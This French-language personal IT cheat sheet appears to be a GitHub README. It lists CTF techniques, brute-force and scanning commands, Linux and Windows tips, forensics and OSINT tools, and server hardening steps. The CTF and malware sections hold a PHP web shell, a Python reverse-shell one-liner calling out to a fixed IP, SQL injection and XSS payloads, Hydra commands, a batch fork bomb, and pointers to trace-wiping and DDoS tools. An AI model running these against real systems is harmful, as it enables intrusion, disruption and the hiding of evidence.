# Useful

> Le but de ce document est de regrouper les différents informations à propos de l'IT dans un seul répository accessible de partout

## CTF

- Reverse shell PHP --> [PentestMonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
	- `<?php system($_GET["cmd"]) ?>`

- [Reverse shell](https://www.synetis.com/etablir-un-reverse-shell-en-une-ligne/)
	- `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("81.253.72.139",53));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'`
	- Spawn un shell root --> `python3 -c 'import pty,os; os.setuid(0);os.setgid(0);pty.spawn("/bin/bash")'`

### Tools

- [BugBountyTool](https://github.com/vavkamil/awesome-bugbounty-tools) (regroupe les tools CTF)

- [Moonwalk](https://github/moonwalk/mufeedvh/moonwalk) --> efface les traces après des actions sur un système

### Payload

- ' or 1=1- - --> Bypass authentification web
	- [Payload](https://github.com/payloadbox/sql-injection-payload-list)


- [Xss Payload](https://github.com/payloadbox/xss-payload-list) --> Payload XSS
	- `<iframe src="javascript:alert('xss')">`
	
## BruteForce
### Hydra

- Password WEB --> `hydra -l molly -P rockyou.txt 10.10.212.76 http-post-form "/login:username=^USER^&password=^PASS^:incorrect" -V`

- Password SSH --> `hydra -l molly -P rockyou.txt 10.10.212.76 ssh`

- Password FTP --> `hydra -l chris -P /usr/share/wordlist/rockyou.txt 10.10.150.97 ftp`

### John

- Crack ZIP --> `zip2john X.zip > zip.hashes \n
john zip.hashes`

- Crack clé RSA SSH --> `ssh2john.py secretKey > id_rsa.hash \n john --wordlist=dict.txt id_rsa.hash`
	
## Scan

### Passif 

- Nslookup/dig
- TheHarvester (énumération DNS) --> `theHarvester -d mokoil.com -e 8.8.8.8 -c -n`

- Table ARP

### Actif 
- Voir les ports ouverts --> `nmap -Pn 192.168.1.1`
- Voir la version des services --> `nmap -sV 192.168.1.1`

- Wordpress --> `wpcan --url www.mokoil.com`

- [Linpeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)

- SQLMap --> `sqlmap -u http://192.168.56.109/cgi-bin/badstore.cgi?action=loginregister --dbs --batch searchquery`

## Directory

- Gobuster --> `gobuster dir -u http://10.10.96.122 -w /usr/share/wordlists/dirb/common.txt`

## Linux - Commande

- Monter USB --> `mount /dev/usbNAME /media/usb`
  - Trouver sa clé USB --> `sudo blkid` ou `df -h`
  
- Monter serveur python --> `python3 -m http.server 555 --bind 192.168.1.1`
   - Croc --> Envoyer des fichiers entre 2 PC

- `kali-undercover` --> transforme le GUI en Windows

- `last` --> dernière connexion
- `lastb` --> dernière connexion qui à échoué

- `find / -name XXX 2>/dev/null` --> trouver un fichier dans le système

- `lastlog` --> Voir les différents comptes et leurs dernières connexions

- Pour **compresser avec tar** --> `tar -czvf logs_archive.tar.gz ./*`
    - il est possible de supprimer les fichiers après compressions --> `tar -czvf logs_archive.tar.gz ./* --remove-files`
- Pour **décompresser avec tar** --> `tar -xzvf logs_archive.tar.gz`

- Pour **décompresser avec gz** --> `gunzip -d ficher.gz`
		
- `scp Alcasar-v3.2.ova root@192.168.100.40:/root/Alcasar-v3.2.ova` --> envoyer un fichier via ssh
- `scp -r root@192.168.100.1:/root/ /home/mathis` --> récupérer un fichier via ssh
	 
- Mettre un adresse IP statique sur Ubuntu --> `/etc/netplan/01-netcfg.yaml` (attention fichier `.yaml` donc sensible aux indentations/espaces) :

`	
network:
  version: 2
  renderer: networkd
  ethernets:
    enp0s3:
     dhcp4: no
     addresses: [192.168.1.233/24]
     gateway4: 192.168.1.1
     nameservers:
       addresses: [8.8.8.8]`
       
## Windows - Commande

- Trouver le mot de passe wifi --> `netsh wlan show profiles "Bbox-R&T" key=clear`

## Malware

### Tools

- [Virus Total](https://www.virustotal.com/gui/home/upload) --> étudier un fichier

- MRT --> Analyse PC (application au sein de Windows)

- HOIC --> Attaque DDOS

- [GTFObins](https://gtfobins.github.io/) (liste de binaires vulnérables avec POC)

- [USB Payload](https://github-wiki-see.page/m/hak5darren/USB-Rubber-Ducky/wiki/Payloads) (liste payloads pour attaque via USB)

- Browerling --> Permet de sandboxer un lien 
- OnWorks ou DistroTest --> Sandbox de distribution Linux au sein du naviguateur
- [Sandbox](https://sandboxie-plus.com/) --> Sandbox standalone

- Test PC (tronScript) --> [Tron](https://www.reddit.com/r/TronScript/wiki/downloads/)


### Windows 

- `ECHO@OFF start` (mettre le fichier en .bat) --> lance des choses à la suite

- `%0|%0` (mettre le fichier en .bat) --> Ralentis l'ordinateur

## Forensics

- OsForensics --> Fouiller un PC

- BleachBit --> Supprime les fichiers de façon définitive

- TestDisk --> Recover Data

- MVT --> analyse de téléphone

- Medicat --> Fait sauter les mots de passe

- Kon Boot --> Supprime le mot de passe à la volée

- APKLeaks --> Projet qui scanne une application Android

## OSINT

- Script G-Hunt --> Rassemble les informations à partir d'une adresse mail google

- NexFil --> Trouve les réseaux sociaux d'une personne

- [29a](https://29a.ch/photo-forensics) --> Analyse de photo forensics

- Exif Pilot --> Ajout de donnéees exif à une photo

## Photo

- Real Esrgan --> améliore la qualité des photos
- ImgUpscaler --> Site qui améliore la qualité
- [Resizer.in](https://imageresizer.com/) --> Augmente/Diminue une image en gardant la qualité
	
- [Hama](https://www.hama.app/) --> Efface une personne ou un objet sur une image

- [Deface](https://github.com/ORB-HD/deface) --> Flouter des visages

- [Polarr](https://photoeditor.polarr.com/) --> Outil de retouche en ligne

- Vérifier qu'il n'y a pas de ZIP dans une photo --> `binwalk -e cutie.png`

- [ExifCleaner](https://exifcleaner.com/) --> Enlève les données exif

## Dessin

- [Tldraw](https://www.tldraw.com/) --> faire des shcémas


## Backup

- Pika Backup

- Auto Archiver

- Redo Rescue

- [MeeroDrop](https://www.meerodrop.com/) --> Transfert de fichier jusqu'à 20 Go

- Blomp --> Cloud jusqu'a 200 Go

## Windows 
  
- `dir C:\*.ova /S | more` --> Recherche dans le système un fichier .ova

- `netstat -anpe` --> Tout les flux actifs actutellement

- TronScript --> Evalue le PC et remonte les problèmes

- `powercfg /batteryreport` --> Sort un rapport sur l'état de la batterie (à faire en powershell)

- `ipconfig /displaydns | find X` --> voir les recherches DNS

## Other

- Barrier --> permet d'avoir plusieurs PC sur 1 PC

- Locust --> Test de montée en charge

- DroidCam --> Transforme le téléphone en Webcam

- Automata --> Automatise des tâches Web
	
- Upload files --> [File IO](https://www.file.io/)
- partage de fichier via Tor --> [OnionShare](https://github.com/onionshare/onionshare)

- Find movie --> `"Titre du film" -inurl(html|htm|php|txt) intitle: index.of "last modified" (mp4|avi)`

## Admin Sys

- [Server World](https://www.server-world.info/en/)

- [Crontab](https://crontab.guru/)

## Hardening

- Connexion clé ssh (`PAM authentification` & `password authentification no`)


- Si on a une DMZ mettre en place un bastion (serveur qui sécurise tout ce qui a derrière)


- Désactiver root et avoir un autre compte avec sudo (`permit root login no`)


- Désactiver open ssl server si pas nécessaire


- Mettre en place fail2ban


- Avoir le firewall iptables :


	- `iptables -A INPUT -i eth0 -p tcp --dport 22 -m state NEW,ESTABLISHED -j ACCEPT`
	  --> Ce qui rentre sur le serveur (INPUT) via l'interface ETH0 avec le protocole TCP et le port de DESTINATION 22 on l'accepte

	- `iptables -A OUTPUT -o eth0 -p tcp --sport 22 -m state ESTABLISHED -j ACCEPT`
	  --> Ce qui sort du serveur (OUTPUT) via l'interface ETH0 avec le protocole TCP et le port de SORTIE 22 on l'accepte

	- `iptables -P INPUT DROP`
	  --> Tout ce qui rentre pas dans les critères on le drop


- Mettre en place les backups

- Mot de passe dans le Bios
 
- Désactiver l'USB

- [AutoPWN](https://github.com/GamehunterKaan/AutoPWN-Suite) --> script qui détecte les vulnérabilités
- [SecureWeb](https://doubletake.fr/securiser-simplement-son-serveur.html) --> Guide de sécurisation

- Script [CIS](https://github.com/ovh/debian-cis) ou [Lynis](https://github.com/CISOfy/Lynis)
